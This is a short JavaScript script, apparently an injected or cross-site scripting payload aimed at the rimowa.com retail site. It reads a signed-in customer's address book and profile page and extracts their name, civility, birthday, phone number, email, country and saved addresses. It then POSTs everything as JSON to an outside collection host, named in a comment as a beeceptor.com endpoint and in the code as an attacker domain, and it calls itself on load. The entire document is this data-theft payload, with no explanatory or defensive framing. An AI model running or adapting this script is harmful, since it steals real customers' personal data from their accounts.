async function fetchDataAndSend() {
   try {
       // 1. Send a request to the first URL and get the content of <ul class="address-list">
       const addressBookResponse = await fetch('https://www.rimowa.com/fr/fr/addressbook');
       const addressBookHtml = await addressBookResponse.text();

       // Parse the HTML response
       const parser1 = new DOMParser();
       const doc1 = parser1.parseFromString(addressBookHtml, 'text/html');

       // Extract the text content of the <ul class="address-list"> element
       const addressList = doc1.querySelector('ul.address-list');
       const addressListText = addressList ? addressList.textContent.trim() : 'No address list found';

       // 2. Send a request to the second URL and retrieve the values of specific elements by ID
       const profileResponse = await fetch('https://www.rimowa.com/de/en/profile');
       const profileHtml = await profileResponse.text();

       // Parse the HTML response
       const parser2 = new DOMParser();
       const doc2 = parser2.parseFromString(profileHtml, 'text/html');

       // Extract the "value" attributes of the specified elements by their IDs
       const values = {
           firstname: doc2.querySelector('#dwfrm_profile_customer_firstname')?.value || 'No value',
           civility: doc2.querySelector('#dwfrm_profile_customer_civility')?.value || 'No value',
           lastname: doc2.querySelector('#dwfrm_profile_customer_lastname')?.value || 'No value',
           country: doc2.querySelector('#dwfrm_profile_customer_country')?.value || 'No value',
           birthday: doc2.querySelector('#dwfrm_profile_customer_birthday')?.value || 'No value',
           phone: doc2.querySelector('#dwfrm_profile_customer_phone')?.value || 'No value',
           email: doc2.querySelector('#dwfrm_profile_customer_email')?.value || 'No value',
       };

       // 3. Send the extracted data to https://dindindin.free.beeceptor.com
       const result = {
           addressListText, // Text from the address list
           profileData: values, // Extracted values from the second URL
       };

       // Send the data as a POST request with JSON content
       await fetch('https://[ATTACKER-DOMAIN]', {
           method: 'POST',
           headers: {
               'Content-Type': 'application/json'
           },
           body: JSON.stringify(result) // Convert the result object to a JSON string
       });

       console.log('Data sent successfully:', result); // Log the successful operation
   } catch (error) {
       // Handle and log any errors during the process
       console.error('Error:', error);
   }
}

// Call the function to execute the operations
fetchDataAndSend();
